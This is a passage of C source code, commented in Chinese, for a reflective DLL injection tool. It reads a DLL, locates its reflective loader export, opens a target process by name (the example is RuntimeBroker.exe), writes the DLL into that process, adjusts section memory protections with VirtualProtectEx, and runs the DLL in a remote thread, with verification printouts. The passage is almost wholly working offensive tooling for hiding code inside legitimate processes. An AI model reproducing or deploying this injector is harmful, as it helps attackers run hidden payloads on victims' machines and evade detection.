		if (VirtualQueryEx(hProcess, pAddress + sectionHeader[i].VirtualAddress, &mbi, sizeof(mbi))) {
			DWORD protection = mbi.Protect;
			printf("\t[+] 节区 '%s': ", sectionName);

			// 解析保护标志
			if (protection & PAGE_NOACCESS) printf("无访问权限");
			else if (protection & PAGE_READONLY) printf("只读");
			else if (protection & PAGE_READWRITE) printf("读写");
			else if (protection & PAGE_WRITECOPY) printf("写时复制");
			else if (protection & PAGE_EXECUTE) printf("执行");
			else if (protection & PAGE_EXECUTE_READ) printf("执行/读");
			else if (protection & PAGE_EXECUTE_READWRITE) printf("执行/读写");
			else if (protection & PAGE_EXECUTE_WRITECOPY) printf("执行/写时复制");
			else printf("未知权限: 0x%X", protection);

			// 验证节区特性与保护标志是否匹配
			BOOL isExecutable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE;
			BOOL isWritable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE;
			BOOL isReadable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ;

			printf(" (特性: %s%s%s)\n",
				isExecutable ? "可执行 " : "",
				isWritable ? "可写 " : "",
				isReadable ? "可读" : "");

			// 验证保护标志是否与节区特性匹配
			BOOL protectionMatches = TRUE;

			if (isExecutable && !(protection & PAGE_EXECUTE) &&
				!(protection & PAGE_EXECUTE_READ) &&
				!(protection & PAGE_EXECUTE_READWRITE) &&
				!(protection & PAGE_EXECUTE_WRITECOPY)) {
				printf("\t   [!] 警告: 节区需要可执行权限但未设置\n");
				protectionMatches = FALSE;
			}

			if (isWritable && !(protection & PAGE_READWRITE) &&
				!(protection & PAGE_WRITECOPY) &&
				!(protection & PAGE_EXECUTE_READWRITE) &&
				!(protection & PAGE_EXECUTE_WRITECOPY)) {
				printf("\t   [!] 警告: 节区需要可写权限但未设置\n");
				protectionMatches = FALSE;
			}

			if (isReadable && !(protection & PAGE_READONLY) &&
				!(protection & PAGE_READWRITE) &&
				!(protection & PAGE_EXECUTE_READ) &&
				!(protection & PAGE_EXECUTE_READWRITE)) {
				printf("\t   [!] 警告: 节区需要可读权限但未设置\n");
				protectionMatches = FALSE;
			}

			if (protectionMatches) {
				printf("\t   [+] 节区权限正确匹配\n");
			}
			else {
				allSectionsOk = FALSE;

				// 尝试修复节区权限问题
				DWORD desiredProtection = PAGE_NOACCESS;

				if (isReadable && !isWritable && !isExecutable)
					desiredProtection = PAGE_READONLY;
				else if (isReadable && isWritable && !isExecutable)
					desiredProtection = PAGE_READWRITE;
				else if (isReadable && !isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READ;
				else if (isReadable && isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READWRITE;

				if (desiredProtection != PAGE_NOACCESS && desiredProtection != protection) {
					printf("\t   [i] 尝试将节区权限从 0x%X 修改为 0x%X\n", protection, desiredProtection);

					DWORD oldProtect;
					if (VirtualProtectEx(hProcess, pAddress + sectionHeader[i].VirtualAddress,
						sectionHeader[i].Misc.VirtualSize, desiredProtection, &oldProtect)) {
						printf("\t   [+] 成功修改节区权限\n");

						// 验证是否真的修改成功
						MEMORY_BASIC_INFORMATION newMbi;
						if (VirtualQueryEx(hProcess, pAddress + sectionHeader[i].VirtualAddress, &newMbi, sizeof(newMbi))) {
							printf("\t   [i] 新的保护属性: 0x%X\n", newMbi.Protect);
						}
					}
					else {
						printf("\t   [!] 无法修改节区权限，错误: %d\n", GetLastError());
					}
				}
			}
		}
		else {
			printf("\t[!] 无法查询节区 '%s' 的内存信息，错误: %d\n", sectionName, GetLastError());
			allSectionsOk = FALSE;
		}
	}

	printf("\t[+] 节区权限验证%s\n", allSectionsOk ? "全部通过" : "部分失败");
	return TRUE;
}

// 修改后的wmain函数
int wmain(int argc, wchar_t* argv[]) {

	PBYTE	pRflDllBuffer = NULL;
	DWORD	dwRflDllSize = 0x00,
		dwRflFuncOffset = 0x00;

	DWORD	dwProcessId = 0x00;
	HANDLE	hTargetProcess = NULL;

	PWCHAR	pcReflectiveDllName = NULL,
		pcTargetProcessName = NULL;

	if (argc != 5 || !FetchArguments(argv, argc, &pcReflectiveDllName, &pcTargetProcessName)) {

		printf("[!] Usage: %ws -rfldll <Reflective DLL Path> -p <Target Process Name>\n", GET_FILENAME(argv[0]));
		printf("\t>>> Example: %ws -rfldll ReflectiveDllLdr.dll -p RuntimeBroker.exe \n\n", GET_FILENAME(argv[0]));
		return -1;
	}

	printf("[i] Reading %ws ... ", pcReflectiveDllName);
	if (!ReadReflectiveDll(pcReflectiveDllName, &pRflDllBuffer, &dwRflDllSize))
		return -1;
	printf("[+] DONE \n");

	printf("[i] Calculating %s's File Offset ... ", EXPORTED_FUNC_NAME);
	if (!(dwRflFuncOffset = GetReflectiveFunctionOffset(pRflDllBuffer)))
		return -1;
	printf("[+] DONE \n");

	printf("[*] Found %s's Offset At: 0x%0.8X \n", EXPORTED_FUNC_NAME, dwRflFuncOffset);

	printf("[i] Getting %ws's PID ... ", pcTargetProcessName);
	if (!GetRemoteProcessHandle(pcTargetProcessName, &dwProcessId, &hTargetProcess))
		return -1;
	printf("[+] DONE \n");

	printf("[*] Found %ws's PID: %d \n", pcTargetProcessName, dwProcessId);

	printf("[i] Injecting The Reflective DLL Into %ws ... \n", pcTargetProcessName);

	// 保存实际注入的DLL地址
	PBYTE injectedAddress = NULL;

	// 步骤1: 仅注入DLL，不执行
	if (!InjectRflDll(hTargetProcess, pRflDllBuffer, dwRflDllSize, &injectedAddress)) {
		printf("[!] Injection Failed \n");
		return -1;
	}
	printf("[+] Injection Completed \n");

	// 步骤2: 注入后，执行前验证
	printf("[i] 注入后验证 (执行前)...\n");

	// 使用原始DLL缓冲区的副本进行验证，以避免修改原始数据
	PBYTE dllBufferCopy = ALLOC(dwRflDllSize);
	if (dllBufferCopy) {
		memcpy(dllBufferCopy, pRflDllBuffer, dwRflDllSize);

		// 验证导入表 - 使用实际注入的地址
		printf("\t[i] 使用注入地址: 0x%p 进行验证\n", injectedAddress);
		VerifyImportTable(hTargetProcess, injectedAddress, dllBufferCopy);

		// 验证节区权限
		VerifySectionPermissions(hTargetProcess, injectedAddress, dllBufferCopy);

		printf("[+] 执行前验证完成\n");

		// 步骤3: 尝试修复内存和权限问题
		printf("[i] 尝试修复内存布局...\n");
		FixSectionMemory(hTargetProcess, injectedAddress, dllBufferCopy);
		printf("[+] 修复操作完成\n");

		// 步骤4: 再次验证
		printf("[i] 修复后再次验证...\n");
		VerifyImportTable(hTargetProcess, injectedAddress, dllBufferCopy);
		VerifySectionPermissions(hTargetProcess, injectedAddress, dllBufferCopy);
		printf("[+] 再次验证完成\n");

		FREE(dllBufferCopy);
	}
	else {
		printf("[!] 无法分配内存用于DLL验证\n");
	}

	// 步骤5: 执行DLL
	printf("[i] 执行DLL...\n");
	HANDLE hThread = NULL;
	if (!ExecuteRflDll(hTargetProcess, injectedAddress, dwRflFuncOffset, &hThread)) {
		printf("[!] Execution Failed \n");
		return -1;
	}

	// 等待线程执行完成
	printf("[i] 等待线程执行完成...\n");
	WaitForSingleObject(hThread, 5000); // 等待最多5秒
	CloseHandle(hThread);
	printf("[+] 线程执行结束\n");

	// 步骤6: 执行后验证
	printf("[i] 执行后验证...\n");
	dllBufferCopy = ALLOC(dwRflDllSize);
	if (dllBufferCopy) {
		memcpy(dllBufferCopy, pRflDllBuffer, dwRflDllSize);

		VerifyImportTable(hTargetProcess, injectedAddress, dllBufferCopy);
		VerifySectionPermissions(hTargetProcess, injectedAddress, dllBufferCopy);

		FREE(dllBufferCopy);
	}

	printf("[+] 所有操作完成\n");

	return 0;
}



